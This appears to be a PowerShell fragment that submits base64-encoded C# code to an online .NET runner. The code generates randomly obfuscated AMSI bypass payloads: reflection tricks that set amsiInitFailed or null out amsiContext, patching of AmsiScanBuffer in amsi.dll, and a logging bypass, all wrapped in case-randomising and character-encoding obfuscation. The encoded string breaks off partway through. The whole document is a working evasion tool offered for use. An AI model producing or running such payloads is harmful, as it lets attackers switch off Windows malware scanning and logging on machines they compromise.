$destinationaddr = "https://dotnetfiddle.net/Home/Run"
$jsonpostrequestbase64 = "eyJDb2RlQmxvY2siOiJ1c2luZyBTeXN0ZW07XG51c2luZyBTeXN0ZW0uUnVudGltZTtcbnVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljO1xudXNpbmcgU3lzdGVtLkxpbnE7XG51c2luZyBTeXN0ZW0uVGV4dDtcbnVzaW5nIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucztcblxuXG5wdWJsaWMgY2xhc3MgR2VuZXJhdGVBTUJZXG57XG4gICAgcHJpdmF0ZSBzdGF0aWMgUmFuZG9tIHJhbmRvbSA9IG5ldyBSYW5kb20oKTtcblxuICAgIHB1YmxpYyBzdGF0aWMgaW50IFJhbmRvbU51bWJlcihpbnQgbWluLCBpbnQgbWF4KVxuICAgIHtcbiAgICAgICAgcmV0dXJuIHJhbmRvbS5OZXh0KG1pbiwgbWF4KTtcbiAgICB9XG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgT2JmdUNoYXJCdXRlKGNoYXIgY2hhcmluKVxuICAgIHtcblxuICAgICAgICBpbnQgYXNjaWlJbnQgPSBDb252ZXJ0LlRvSW50MzIoY2hhcmluKTtcbiAgICAgICAgdmFyIGFzY2lpQnl0ZSA9IENvbnZlcnQuVG9CeXRlKGFzY2lpSW50KS5Ub1N0cmluZygmcXVvdDtYJnF1b3Q7KTtcbiAgICAgICAgcmV0dXJuICZxdW90O1smcXVvdDsgKyBSYW5kb21DYXNlKCZxdW90O0NIQVImcXVvdDspICsgJnF1b3Q7XVsmcXVvdDsgKyBSYW5kb21DYXNlKCZxdW90O0JZVEUmcXVvdDspICsgJnF1b3Q7XTB4JnF1b3Q7ICsgYXNjaWlCeXRlO1xuICAgIH1cbiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBSYW5kb21DYXNlKHN0cmluZyBpbnB1dClcbiAgICB7XG4gICAgICAgIHJldHVybiBuZXcgc3RyaW5nKChpbnB1dC5TZWxlY3QoeCA9Jmd0OyByYW5kb20uTmV4dCgpICUgMiA9PSAwID8gKGNoYXIuSXNVcHBlcih4KSA/IHguVG9TdHJpbmcoKS5Ub0xvd2VyKCkuRmlyc3QoKSA6IHguVG9TdHJpbmcoKS5Ub1VwcGVyKCkuRmlyc3QoKSkgOiB4KSkuVG9BcnJheSgpKTtcbiAgICB9XG5cblxuICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEJ5dGVFbmNvZGUoY2hhciBpbnB1dENoYXIpXG4gICAge1xuICAgICAgICAvL0dldCB0aGUgYXNjaWkgdmFsdWUgb2YgdGhlIGNoYXJcbiAgICAgICAgaW50IGFzY2lpVmFsdWUgPSBDb252ZXJ0LlRvSW50MzIoaW5wdXRDaGFyKTtcbiAgICAgICAgc3RyaW5nIHJhbmRvbWNhc2VvZkJ5dGUgPSBSYW5kb21DYXNlKCZxdW90O2J5dGUmcXVvdDspO1xuICAgICAgICBzdHJpbmcgYXNjaWlWYWx1ZU9mWCA9IENvbnZlcnQuVG9CeXRlKGFzY2lpVmFsdWUpLlRvU3RyaW5nKCZxdW90O1gmcXVvdDspO1xuXG4gICAgICAgIHN0cmluZyBvdXRwdXQgPSBTdHJpbmcuRm9ybWF0KCZxdW90OyhbezB9XTB4ezF9KSZxdW90OywgcmFuZG9tY2FzZW9mQnl0ZSwgYXNjaWlWYWx1ZU9mWCk7ICAvLyByZXR1cm4gJCZxdW90Oyhbe1JhbmRvbUNhc2UoJnF1b3Q7Ynl0ZSZxdW90Oyl9XTB4e0NvbnZlcnQuVG9CeXRlKGFzY2lpVmFsdWUpLlRvU3RyaW5nKCZxdW90O1gmcXVvdDspfSkmcXVvdDs7XG4gICAgICAgIHJldHVybiBvdXRwdXQ7XG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgRGlhY3JpdGljRW5jb2RlKHN0cmluZyBpbnB1dENoYXIpXG4gICAge1xuICAgICAgICBzdHJpbmcgY2hhckJ1aWxkZXIgPSAmcXVvdDsmcXVvdDs7XG4gICAgICAgIGZvcmVhY2ggKHZhciBfY2hhciBpbiBpbnB1dENoYXIpXG4gICAgICAgIHtcbiAgICAgICAgICAgIGNoYXJCdWlsZGVyICs9IEdldFJhbmRvbURpYWNyaXRpYyhDb252ZXJ0LlRvSW50MzIoX2NoYXIpKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gY2hhckJ1aWxkZXI7XG5cbiAgICB9XG5cbiAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgR2V0UmFuZG9tRGlhY3JpdGljKGludCBhc2NpaVZhbHVlKVxuICAgIHtcbiAgICAgICAgc3dpdGNoIChhc2NpaVZhbHVlKVxuICAgICAgICB7XG4gICAgICAgICAgICBjYXNlIDY1OiAgIC8vQVxuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMTkyLCAxOTcpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgY2FzZSA5NzogIC8vYVxuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMjI0LCAyMjkpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgY2FzZSA3MzogIC8vSVxuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMjA0LCAyMDcpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgY2FzZSAxMDU6ICAvL2lcbiAgICAgICAgICAgICAgICByZXR1cm4gQ29udmVydC5Ub0NoYXIoUmFuZG9tTnVtYmVyKDIzNiwgMjM5KSkuVG9TdHJpbmcoKTtcbiAgICAgICAgICAgIGNhc2UgNzk6ICAvL09cbiAgICAgICAgICAgICAgICByZXR1cm4gQ29udmVydC5Ub0NoYXIoUmFuZG9tTnVtYmVyKDIxMCwgMjE2KSkuVG9TdHJpbmcoKTtcbiAgICAgICAgICAgIGNhc2UgNjk6IC8vRVxuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMjM2LCAyMzkpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgY2FzZSAxMTE6IC8vb1xuICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQ2hhcihSYW5kb21OdW1iZXIoMjQzLCAyNDYpKS5Ub1N0cmluZygpO1xuICAgICAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgICAgICByZXR1cm4gQ29udmVydC5Ub0NoYXIoYXNjaWlWYWx1ZSkuVG9TdHJpbmcoKTtcbiAgICAgICAgfVxuXG5cbiAgICB9XG5cbiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBIVE1MRW5jb2RlKHN0cmluZyBpbnB1dENoYXIpXG4gICAge1xuICAgICAgICB2YXIgY2hhckJ1aWxkZXIgPSAmcXVvdDsmcXVvdDs7XG4gICAgICAgIGZvcmVhY2ggKHZhciBfY2hhciBpbiBpbnB1dENoYXIpXG4gICAgICAgIHtcbiAgICAgICAgICAgIGNoYXJCdWlsZGVyICs9IFN0cmluZy5Gb3JtYXQoJnF1b3Q7JmFtcDsjJnF1b3Q7ICsgQ29udmVydC5Ub0ludDMyKF9jaGFyKSArICZxdW90OzsmcXVvdDspOyAvLyBpZGsgd2h5IHRoaXMgZ3V5IHVzZXMgaW50ZXJwb2xhdGVkIHN0cmluZyBvbiBoZXJlXG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIGNoYXJCdWlsZGVyO1xuXG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgQ2hhckVuY29kZShjaGFyIGlucHV0Q2hhcilcbiAgICB7XG4gICAgICAgIC8vR2V0IHRoZSBhc2NpaSB2YWx1ZSBvZiB0aGUgY2hhclxuICAgICAgICBpbnQgYXNjaWlWYWx1ZSA9IENvbnZlcnQuVG9JbnQzMihpbnB1dENoYXIpO1xuXG4gICAgICAgIC8vT2JmdXNjYXRlIHRoZSBpbnQgdmFsdWVcbiAgICAgICAgcmV0dXJuIE9iZnVzY2F0ZUludChhc2NpaVZhbHVlKS5Ub1N0cmluZygpO1xuXG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgT2JmdXNjYXRlQ2hhcihjaGFyIGNoYXJJbnB1dCwgc3RyaW5nIHN0YXJ0Q2hhciA9ICZxdW90OysmcXVvdDspXG4gICAge1xuXG4gICAgICAgIC8vU2VsZWN0IGEgcmFuZG9tIGVuY29kaW5nIG1ldGhvZCBmb3IgYSBzaW5nbGUgY2hhclxuICAgICAgICBzd2l0Y2ggKFJhbmRvbU51bWJlcigxLCAzKSlcbiAgICAgICAge1xuICAgICAgICAgICAgY2FzZSAxOlxuICAgICAgICAgICAgICAgIHJldHVybiBzdGFydENoYXIgKyAmcXVvdDtbJnF1b3Q7ICsgUmFuZG9tQ2FzZSgmcXVvdDtDSEFSJnF1b3Q7KSArICZxdW90O10mcXVvdDsgKyBCeXRlRW5jb2RlKGNoYXJJbnB1dCk7XG4gICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgcmV0dXJuIHN0YXJ0Q2hhciArICZxdW90O1smcXVvdDsgKyBSYW5kb21DYXNlKCZxdW90O0NIQVImcXVvdDspICsgJnF1b3Q7XSZxdW90OyArIENoYXJFbmNvZGUoY2hhcklucHV0KTtcbiAgICAgICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuIHN0YXJ0Q2hhciArICZxdW90O1smcXVvdDsgKyBSYW5kb21DYXNlKCZxdW90O0NIQVImcXVvdDspICsgJnF1b3Q7XSZxdW90OyArIENoYXJFbmNvZGUoY2hhcklucHV0KTtcbiAgICAgICAgfVxuXG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgT2JmdXNjYXRlSW50KGludCBhc2NpaUludClcbiAgICB7XG4gICAgICAgIHZhciBzdWJOdW1iZXIgPSBSYW5kb21OdW1iZXIoYXNjaWlJbnQgLSBhc2NpaUludCArIDEsIChhc2NpaUludCAtIDIpKTtcblxuICAgICAgICBzd2l0Y2ggKFJhbmRvbU51bWJlcigxLCA1KSlcbiAgICAgICAge1xuICAgICAgICAgICAgY2FzZSAxOlxuICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXQxID0gU3RyaW5nLkZvcm1hdCgmcXVvdDsoezB9K3sxfSkmcXVvdDssIHN1Yk51bWJlciwgKGFzY2lpSW50IC0gc3ViTnVtYmVyKSk7XG4gICAgICAgICAgICAgICAgcmV0dXJuIG91dHB1dDE7Ly8gcmV0dXJuICQmcXVvdDsoe3N1Yk51bWJlcn0re2FzY2lpSW50IC0gc3ViTnVtYmVyfSkmcXVvdDs7XG4gICAgICAgICAgICBjYXNlIDI6XG4gICAgICAgICAgICAgICAgc3RyaW5nIG91dHB1dDIgPSBTdHJpbmcuRm9ybWF0KCZxdW90Oyh7MH0tezF9KSZxdW90OywgKGFzY2lpSW50ICsgc3ViTnVtYmVyKSwgc3ViTnVtYmVyKTtcbiAgICAgICAgICAgICAgICByZXR1cm4gb3V0cHV0MjsvLyByZXR1cm4gJCZxdW90Oyh7YXNjaWlJbnQgKyBzdWJOdW1iZXJ9LXtzdWJOdW1iZXJ9KSZxdW90OztcbiAgICAgICAgICAgIGNhc2UgMzpcbiAgICAgICAgICAgICAgICBzdHJpbmcgb3V0cHV0MyA9IFN0cmluZy5Gb3JtYXQoJnF1b3Q7KHswfS97MX0pJnF1b3Q7LCAoYXNjaWlJbnQgKiBzdWJOdW1iZXIpLCBzdWJOdW1iZXIpO1xuICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQzOy8vIHJldHVybiAkJnF1b3Q7KHthc2NpaUludCAqIHN1Yk51bWJlcn0ve3N1Yk51bWJlcn0pJnF1b3Q7O1xuICAgICAgICAgICAgY2FzZSA0OlxuICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXQ0ID0gU3RyaW5nLkZvcm1hdCgmcXVvdDsoezB9KSZxdW90OywgYXNjaWlJbnQpO1xuICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ0Oy8vIHJldHVybiAkJnF1b3Q7KHthc2NpaUludH0pJnF1b3Q7O1xuICAgICAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgICAgICBzdHJpbmcgb3V0cHV0NSA9IFN0cmluZy5Gb3JtYXQoJnF1b3Q7KHswfS97MX0pJnF1b3Q7LCAoYXNjaWlJbnQgKiBzdWJOdW1iZXIpLCBzdWJOdW1iZXIpO1xuICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ1Oy8vIHJldHVybiAkJnF1b3Q7KHthc2NpaUludCAqIHN1Yk51bWJlcn0ve3N1Yk51bWJlcn0pJnF1b3Q7O1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgT2JmdXNjYXRlU3RyaW5nKHN0cmluZyBkYXRhLCBpbnQgbWF4Q2FzZSA9IDMpXG4gICAge1xuICAgICAgICBzdHJpbmcgb2JmdXNjYXRlZFN0cmluZyA9ICZxdW90OyZxdW90OztcbiAgICAgICAgc3dpdGNoIChSYW5kb21OdW1iZXIoMSwgbWF4Q2FzZSkpXG4gICAgICAgIHtcbiAgICAgICAgICAgIGNhc2UgMTpcbiAgICAgICAgICAgICAgICBmb3JlYWNoIChjaGFyIF9jaGFyIGluIGRhdGEpXG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBvYmZ1c2NhdGVkU3RyaW5nICs9IE9iZnVzY2F0ZUNoYXIoX2NoYXIpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICByZXR1cm4gb2JmdXNjYXRlZFN0cmluZztcbiAgICAgICAgICAgIGNhc2UgMjpcbiAgICAgICAgICAgICAgICBzdHJpbmcgb2JmdXNjYXRlZEZvcm1EID0gJnF1b3Q7JnF1b3Q7O1xuICAgICAgICAgICAgICAgIHN0cmluZyBvYmZ1c2NhdGVkUGF0dGVybiA9ICZxdW90OyZxdW90OztcblxuICAgICAgICAgICAgICAgIGZvcmVhY2ggKGNoYXIgX2NoYXIgaW4gJnF1b3Q7Rm9ybUQmcXVvdDspXG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICBvYmZ1c2NhdGVkRm9ybUQgKz0gT2JmdXNjYXRlQ2hhcihfY2hhcik7XG4gICAgICAgICAgICAgICAgfVxuXG4gICAgICAgICAgICAgICAgZm9yZWFjaCAoY2hhciBfY2hhciBpbiBAJnF1b3Q7XFxwe01ufSZxdW90OylcbiAgICAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgICAgIG9iZnVzY2F0ZWRQYXR0ZXJuICs9IE9iZnVzY2F0ZUNoYXIoX2NoYXIpO1xuICAgICAgICAgICAgICAgIH1cblxuICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXQ2ID0gU3RyaW5nLkZvcm1hdCgmcXVvdDsrJiN4Mjc7ezB9JiN4Mjc7LiZxdW90OywgKERpYWNyaXRpY0VuY29kZShkYXRhKSkpO1xuICAgICAgICAgICAgICAgIHJldHVybiBvdXRwdXQ2ICsgUmFuZG9tQ2FzZSgmcXVvdDtOb3JtYWxpemUmcXVvdDspICsgJnF1b3Q7KCZxdW90OyArIG9iZnVzY2F0ZWRGb3JtRC5SZW1vdmUoMCwgMSkgKyAmcXVvdDspIC1yZXBsYWNlICZxdW90OyArIG9iZnVzY2F0ZWRQYXR0ZXJuLlJlbW92ZSgwLCAxKTtcbiAgICAgICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuICZxdW90OyZxdW90OztcbiAgICAgICAgfVxuICAgIH1cblxuICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJhbmRvbVN0cmluZyhpbnQgc2l6ZSwgYm9vbCBsb3dlckNhc2UgPSBmYWxzZSlcbiAgICB7XG4gICAgICAgIHZhciBidWlsZGVyID0gbmV3IFN0cmluZ0J1aWxkZXIoc2l6ZSk7XG4gICAgICAgIGNoYXIgb2Zmc2V0ID0gbG93ZXJDYXNlID8gJiN4Mjc7YSYjeDI3OyA6ICYjeDI3O0EmI3gyNzs7XG4gICAgICAgIGNvbnN0IGludCBsZXR0ZXJzT2Zmc2V0ID0gMjY7XG5cbiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgJmx0OyBzaXplOyBpKyspXG4gICAgICAgIHtcbiAgICAgICAgICAgIHZhciBAY2hhciA9IChjaGFyKXJhbmRvbS5OZXh0KG9mZnNldCwgb2Zmc2V0ICsgbGV0dGVyc09mZnNldCk7XG4gICAgICAgICAgICBidWlsZGVyLkFwcGVuZChAY2hhcik7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIGxvd2VyQ2FzZSA/IGJ1aWxkZXIuVG9TdHJpbmcoKS5Ub0xvd2VyKCkgOiBidWlsZGVyLlRvU3RyaW5nKCk7XG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgZW5jb2RlUGF5bG9hZChzdHJpbmcgZXhhbXBsZVBheWxvYWRzLCBib29sIGRvdWJsZVF1dGVzID0gZmFsc2UpXG4gICAge1xuICAgICAgICAvL1JlZ2V4IHRvIHB1bGwgb3V0IGFsbCBzdHJpbmdzIGluc2lkZSAmI3gyNzsqJiN4Mjc7IHRhZ3NcbiAgICAgICAgUmVnZXggcmdTdHJpbmdSdWxlID0gbmV3IFJlZ2V4KEAmcXVvdDtcXCYjeDI3OyguKj8pXFwmI3gyNzsmcXVvdDssIFJlZ2V4T3B0aW9ucy5Db21waWxlZCB8IFJlZ2V4T3B0aW9ucy5JZ25vcmVDYXNlKTtcblxuICAgICAgICAvL1B1bGwgYWxsIGFsbCByZXN1bHRzIHRoYXQgYXJlIG5vdCBlbXB0eVxuICAgICAgICBMaXN0Jmx0O3N0cmluZyZndDsgbWF0Y2hlZFN0cmluZ3MgPSAocmdTdHJpbmdSdWxlLk1hdGNoZXMoZXhhbXBsZVBheWxvYWRzKSkuQ2FzdCZsdDtNYXRjaCZndDsoKS5XaGVyZSh4ID0mZ3Q7ICFzdHJpbmcuSXNOdWxsT3JFbXB0eSh4LlZhbHVlKSkuU2VsZWN0KHggPSZndDsgeC5WYWx1ZSkuVG9MaXN0KCk7XG5cbiAgICAgICAgLy9pZiB0aGVyZSBpcyBhbnkgcmVzdWx0c1xuICAgICAgICBpZiAobWF0Y2hlZFN0cmluZ3MuQ291bnQoKSAmZ3Q7IDApXG4gICAgICAgIHtcbiAgICAgICAgICAgIC8vUGljayBPTkUgb2YgdGhlbSBhdCByYW5kb21cbiAgICAgICAgICAgIHN0cmluZyByYW5kb21TdHJpbmcgPSBtYXRjaGVkU3RyaW5nc1tSYW5kb21OdW1iZXIoMCwgbWF0Y2hlZFN0cmluZ3MuQ291bnQoKSldO1xuXG4gICAgICAgICAgICAvL09iZnVzY2F0ZSB0aGUgd2hvbGUgc3RyaW5nXG4gICAgICAgICAgICBzdHJpbmcgcmFuZG9tT2JmdXNjYXRlZFN0cmluZyA9IE9iZnVzY2F0ZVN0cmluZyhyYW5kb21TdHJpbmcuUmVwbGFjZSgmcXVvdDsmI3gyNzsmcXVvdDssICZxdW90OyZxdW90OykpLlRyaW1TdGFydChuZXdbXSB7JiN4Mjc7KyYjeDI3O30pO1xuXG4gICAgICAgICAgICAvL1JlcGxhY2VcbiAgICAgICAgICAgIGV4YW1wbGVQYXlsb2FkcyA9IGV4YW1wbGVQYXlsb2Fkcy5SZXBsYWNlKHJhbmRvbVN0cmluZywgJnF1b3Q7JCgmcXVvdDsgKyByYW5kb21PYmZ1c2NhdGVkU3RyaW5nICsgJnF1b3Q7KSZxdW90Oyk7XG4gICAgICAgIH1cblxuXG4gICAgICAgIC8vV2lsbCBhZGQgbW9yZSBrZXkgd29yZHMgaGVyZVxuICAgICAgICB2YXIgbXVzdEVuY29kZURpY3QgPSBuZXcgRGljdGlvbmFyeSZsdDtzdHJpbmcsIGR5bmFtaWMmZ3Q7KCk7XG5cbiAgICAgICAgLy9GaW5kIGEgd2F5IGZvciB0aGUga2V5d29yZHMgdG8gZGV0ZXJtZW5lIGlmIHRoZWlyIHdpdGhpbiBzaW5nbGUgb3IgZG91YmxlIFEmI3gyNztzXG4gICAgICAgIC8vUmUtYWRkIGh0bWxlbmNvZGVcbiAgICAgICAgLy9cblxuICAgICAgICBtdXN0RW5jb2RlRGljdC5BZGQoJnF1b3Q7YW1zaUNvbnRleHQmcXVvdDssIG5ld3sgZG91YmxlUSA9IHRydWUsIG1heEVuYyA9IDMgfSk7XG4gICAgICAgIG11c3RFbmNvZGVEaWN0LkFkZCgmcXVvdDthbXNpU2Vzc2lvbiZxdW90OywgbmV3eyBkb3VibGVRID0gdHJ1ZSwgbWF4RW5jID0gMyB9KTtcbiAgICAgICAgbXVzdEVuY29kZURpY3QuQWRkKCZxdW90O0Ftc2lVdGlscyZxdW90OywgbmV3eyBkb3VibGVRID0gdHJ1ZSwgbWF4RW5jID0gMyB9KTtcblxuICAgICAgICBtdXN0RW5jb2RlRGljdC5BZGQoJnF1b3Q7YW1zaUluaXRGYWlsZWQmcXVvdDssIG5ld3sgZG91YmxlUSA9IGZhbHNlLCBtYXhFbmMgPSAzIH0pO1xuXG4gICAgICAgIG11c3RFbmNvZGVEaWN0LkFkZCgmcXVvdDtXcml0ZUludDMyJnF1b3Q7LCBuZXd7IGRvdWJsZVEgPSB0cnVlLCBtYXhFbmMgPSAzIH0pO1xuICAgICAgICAvKlxuICAgICAgICB2YXIgbXVzdEVuY29kZURpY3QgPSBuZXcgRGljdGlvbmFyeSZsdDtzdHJpbmcsIGR5bmFtaWMmZ3Q7KCk7IFxuICAgICAgICBtdXN0RW5jb2RlRGljdC5BZGQoJnF1b3Q7dGVzdDEmcXVvdDssIG5ld3sgZG91YmxlUSA9IHRydWUsIG1heEVuYyA9IDMgfSk7IFxuICAgICAgICBDb25zb2xlLldyaXRlTGluZShtdXN0RW5jb2RlRGljdFsmcXVvdDt0ZXN0MSZxdW90O10uZG91YmxlUSk7XG4gICAgICAgICovXG5cblxuICAgICAgICBmb3JlYWNoICh2YXIgd29yZCBpbiBtdXN0RW5jb2RlRGljdClcbiAgICAgICAge1xuICAgICAgICAgICAgc3RyaW5nIG9iZnVzY2F0ZWRTdHJpbmcgPSBPYmZ1c2NhdGVTdHJpbmcod29yZC5LZXksIHdvcmQuVmFsdWUubWF4RW5jKTtcblxuICAgICAgICAgICAgaWYgKHdvcmQuVmFsdWUuZG91YmxlUSlcbiAgICAgICAgICAgICAgICBvYmZ1c2NhdGVkU3RyaW5nID0gJnF1b3Q7JCgmcXVvdDsgKyBvYmZ1c2NhdGVkU3RyaW5nLlRyaW1TdGFydChuZXdbXSB7JiN4Mjc7KyYjeDI3O30pICsgJnF1b3Q7KSZxdW90OztcbiAgICAgICAgICAgIGVsc2VcbiAgICAgICAgICAgICAgICBvYmZ1c2NhdGVkU3RyaW5nID0gJnF1b3Q7JiN4Mjc7KyQoJnF1b3Q7ICsgb2JmdXNjYXRlZFN0cmluZy5UcmltU3RhcnQobmV3W10geyYjeDI3OysmI3gyNzt9KSArICZxdW90OykrJiN4Mjc7JnF1b3Q7O1xuXG4gICAgICAgICAgICBleGFtcGxlUGF5bG9hZHMgPSBleGFtcGxlUGF5bG9hZHMuUmVwbGFjZSh3b3JkLktleSwgb2JmdXNjYXRlZFN0cmluZyk7XG4gICAgICAgIH1cblxuICAgICAgICByZXR1cm4gZXhhbXBsZVBheWxvYWRzO1xuXG4gICAgfVxuXG4gICAgcHVibGljIHN0YXRpYyBzdHJpbmcgZW5jb2RlcmFzdGEoc3RyaW5nIGV4YW1wbGVQYXlsb2FkcylcbiAgICB7XG4gICAgICAgIHZhciBtdXN0RW5jb2RlID0gbmV3IHN0cmluZ1tdIHsgJnF1b3Q7QW1zaVNjYW5CdWZmZXImcXVvdDssICZxdW90O2Ftc2kuZGxsJnF1b3Q7IH07XG5cbiAgICAgICAgdmFyIHZhcnNUb0VuY29kZSA9IG5ldyBzdHJpbmdbXSB7ICZxdW90O0xvYWRMaWJyYXJ5JnF1b3Q7LCAmcXVvdDtHZXRQcm9jQWRkcmVzcyZxdW90OywgJnF1b3Q7VmlydHVhbFByb3RlY3QmcXVvdDssICZxdW90O0NhbGxBU0JCQVBJJnF1b3Q7LCAmcXVvdDtBU0JCQVBJJnF1b3Q7LCAmcXVvdDtMaWJMb2FkJnF1b3Q7LCAmcXVvdDtNZW1BZHImcXVvdDssICZxdW90O1BhdGNoJnF1b3Q7LCAmcXVvdDt2YXIxJnF1b3Q7LCAmcXVvdDt2YXIyJnF1b3Q7LCAmcXVvdDt2YXIzJnF1b3Q7LCAmcXVvdDt2YXI0JnF1b3Q7LCAmcXVvdDt2YXI1JnF1b3Q7LCAmcXVvdDt2YXI2JnF1b3Q7IH07XG5cbiAgICAgICAgLy9NYXliZSByZWxldmFudCBsYXRlciBvblxuICAgICAgICAvL3ZhciBwYXRjaEJ5dGVzID0gbmV3IHN0cmluZ1tdIHsgJnF1b3Q7QjgmcXVvdDssICZxdW90OzU3JnF1b3Q7LCAmcXVvdDswMCZxdW90OywgJnF1b3Q7MDcmcXVvdDssICZxdW90OzgwJnF1b3Q7LCAmcXVvdDtDMyZxdW90OyB9O1xuXG4gICAgICAgIGZvcmVhY2ggKHZhciB3b3JkIGluIHZhcnNUb0VuY29kZSlcbiAgICAgICAge1xuICAgICAgICAgICAgdmFyIG5ld29yZCA9IFJhbmRvbVN0cmluZyh3b3JkLkxlbmd0aCk7XG5cbiAgICAgICAgICAgIGV4YW1wbGVQYXlsb2FkcyA9IGV4YW1wbGVQYXlsb2Fkcy5SZXBsYWNlKHdvcmQsIG5ld29yZCk7XG4gICAgICAgIH1cblxuICAgICAgICBmb3JlYWNoICh2YXIgd29yZCBpbiBtdXN0RW5jb2RlKVxuICAgICAgICB7XG4gICAgICAgICAgICBzdHJpbmcgb2JmdXNjYXRlZFN0cmluZyA9IE9iZnVzY2F0ZVN0cmluZyh3b3JkKTtcblxuICAgICAgICAgICAgb2JmdXNjYXRlZFN0cmluZyA9ICZxdW90OyQoJnF1b3Q7ICsgb2JmdXNjYXRlZFN0cmluZy5UcmltU3RhcnQobmV3W10geyYjeDI3OysmI3gyNzt9KSArICZxdW90OykmcXVvdDs7XG5cbiAgICAgICAgICAgIGV4YW1wbGVQYXlsb2FkcyA9IGV4YW1wbGVQYXlsb2Fkcy5SZXBsYWNlKHdvcmQsIG9iZnVzY2F0ZWRTdHJpbmcpO1xuICAgICAgICB9XG5cbiAgICAgICAgcmV0dXJuIGV4YW1wbGVQYXlsb2FkcztcblxuICAgIH1cbiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZW5lcmF0ZSgpXG4gICAge1xuICAgICAgICAvL1Vua25vd24gLUZvcmNlIGVycm9yXG4gICAgICAgIHZhciBtZW1WYXIgPSBSYW5kb21TdHJpbmcoUmFuZG9tTnVtYmVyKDMsIDEwKSk7XG4gICAgICAgIHZhciBGb3JjZUVycmVyID0gJnF1b3Q7JCZxdW90OyArIG1lbVZhciArICZxdW90Oz1bU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJnF1b3Q7ICsgT2JmdXNjYXRlSW50KDkwNzYpICsgJnF1b3Q7KTtbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKFxcJnF1b3Q7U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHNcXCZxdW90OykuR2V0RmllbGQoXFwmcXVvdDthbXNpU2Vzc2lvblxcJnF1b3Q7LCBcXCZxdW90O05vblB1YmxpYyxTdGF0aWNcXCZxdW90OykuU2V0VmFsdWUoJG51bGwsICRudWxsKTtbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKFxcJnF1b3Q7U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHNcXCZxdW90OykuR2V0RmllbGQoXFwmcXVvdDthbXNpQ29udGV4dFxcJnF1b3Q7LCBcXCZxdW90O05vblB1YmxpYyxTdGF0aWNcXCZxdW90OykuU2V0VmFsdWUoJG51bGwsIFtJbnRQdHJdJCZxdW90OyArIG1lbVZhciArICZxdW90Oyk7JnF1b3Q7O1xuXG4gICAgICAgIC8vIFVzaW5nIE1hdHQgR3JhZWJlcnMgUmVmbGVjdGlvbiBtZXRob2RcbiAgICAgICAgdmFyIE1hdHRHUmVmbCA9ICZxdW90O1tSZWZdLkFzc2VtYmx5LkdldFR5cGUoXFwmcXVvdDtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtc2lVdGlsc1xcJnF1b3Q7KS5HZXRGaWVsZCgmI3gyNzthbXNpSW5pdEZhaWxlZCYjeDI3OyxcXCZxdW90O05vblB1YmxpYyxTdGF0aWNcXCZxdW90OykuU2V0VmFsdWUoJG51bGwsJHRydWUpOyZxdW90OztcblxuICAgICAgICAvL1VzaW5nIE1hdHQgR3JhZWJlcnMgUmVmbGVjdGlvbiBtZXRob2Qgd2l0aCBXTUY1IGF1dG9sb2dnaW5nIGJ5cGFzc1xuICAgICAgICB2YXIgTWF0dEdSZWZsTG9nID0gJnF1b3Q7W0RlbGVnYXRlXTo6Q3JlYXRlRGVsZWdhdGUoKFxcJnF1b3Q7RnVuY2BgM1tTdHJpbmcsICQoKFtTdHJpbmddLkFzc2VtYmx5LkdldFR5cGUo